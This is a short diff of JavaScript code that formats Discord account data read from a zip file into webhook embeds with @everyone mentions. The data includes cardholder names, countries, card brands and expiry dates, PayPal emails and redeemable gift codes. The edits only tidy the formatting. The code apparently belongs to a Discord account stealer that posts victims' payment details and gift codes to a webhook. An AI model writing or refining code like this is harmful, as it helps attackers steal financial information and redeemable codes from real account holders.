@@ -95,16 +95,8 @@ const json = async (zipFile) => {
     color: account.accent_color,
   }); });
   discordAccountInfo.billing.length >= 1 ? discordAccountInfo.billing.forEach(billing => { embeds.push({
-    title: `Discord Account - Billing - ${(() => { switch (billing.type) {
-      case 1:
-        return 'Credit Card';
-      case 2:
-        return 'PayPal';
-      default:
-        return 'Unknown';
-    } })()}`,
+    title: `Discord Account - Billing - ${billingType(billing.type)}`,
     fields: (billing.type === 1 ? [
-      ['ID', billing.id],
       ['Default', billing.default],
       ['Name', billing.billing_address.name],
       ['Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
@@ -112,7 +104,6 @@ const json = async (zipFile) => {
       ['Brand', billing.brand],
       ['Expires in', billing.expires_month + '/' + billing.expires_year]
     ] : [
-      ['ID', billing.id],
       ['Default', billing.default],
       ['Name', billing.billing_address.name],
       ['Email', billing.email],
@@ -125,7 +116,7 @@ const json = async (zipFile) => {
     title: 'Discord Account - Promotions',
     description: discordAccountInfo.gifts.map(gift => {
       return `**${gift.promotion.outbound_title}** - \`\`${gift.code}\`\` ([Redeem](${gift.promotion.outbound_redemption_page_link}))`;
-    }).join('')
+    }).join('\n')
   });
   return {
     content: webhook.content, embeds, allowed_mentions: { parse: ['everyone'], },
